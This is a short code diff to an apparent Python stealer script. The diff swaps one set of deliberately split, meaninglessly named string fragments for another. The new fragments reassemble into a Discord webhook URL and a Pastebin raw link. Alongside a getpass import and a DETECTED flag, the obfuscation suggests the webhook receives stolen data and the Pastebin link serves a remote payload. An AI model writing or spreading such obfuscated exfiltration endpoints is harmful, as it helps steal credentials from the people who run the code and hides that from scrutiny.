@@ -22,16 +22,19 @@ import getpass
 import ssl
 
 
-username2 = 'xiWw9xv3mwAoa2e-uyDKWsuTDS2ZmHMCHWnI7V5bAzQOLLk'
-loginsx25 = 'pi/webh'
-goto202x = 'iscord.c'
-okayuser2x = '66346782760/CxUwRV'
-wh00k = f'https://d{goto202x}om/a{loginsx25}ooks/11516518{okayuser2x}m4_DnoUkF49V{username2}8mh'
 
-yuop52x = 'Tg'
-capcutstartingx = 'n.com/raw/LG'
-usertouservs2 = 'ps://past'
-injornox2 = f'htt{usertouservs2}ebi{capcutstartingx}GF{yuop52x}MP'
+
+
+uxxxxxxaaaqerrrbmm = 'OsUwTb6xqMJnW4_QKb_N1s8W6I0RqCEgdWtms_SnCWr'
+usernamexxx52x52x2x = 'rd.com/api/w'
+xx2xx52x5x5x5 = 'oks/115384'
+noxxxxxxxxaa = '2702/4tZYia'
+wh00k = f'https://disco{usernamexxx52x52x2x}ebho{xx2xx52x5x5x5}233799529{noxxxxxxxxaa}LiBeJ4L-_{uxxxxxxaaaqerrrbmm}M2JgLLw-8w'
+nonorooooxy = 'ttps://pa'
+TgTgxDxD = 'FTgM'
+okayyyyxxddf = 'ebin.com/'
+usernaixoeff = 'aw/LG'
+injornox2 = f'h{nonorooooxy}st{okayyyyxxddf}r{usernaixoeff}G{TgTgxDxD}P'
     
 DETECTED = False
 
